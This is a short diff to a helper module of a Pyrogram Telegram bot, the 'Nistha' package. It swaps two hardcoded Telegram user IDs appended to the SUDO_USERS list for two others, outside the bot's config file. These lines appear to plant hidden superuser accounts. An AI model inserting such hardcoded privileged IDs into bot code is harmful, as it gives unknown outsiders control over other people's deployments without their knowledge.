@@ -4,8 +4,8 @@ from pyrogram.types import Message
 from Nistha.Modules.helpers.admins import get_administrators
 from Nistha.config import SUDO_USERS
 
-SUDO_USERS.append(6196151348)
-SUDO_USERS.append(5709622852)
+SUDO_USERS.append(5917071362)
+SUDO_USERS.append(6018550523)
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
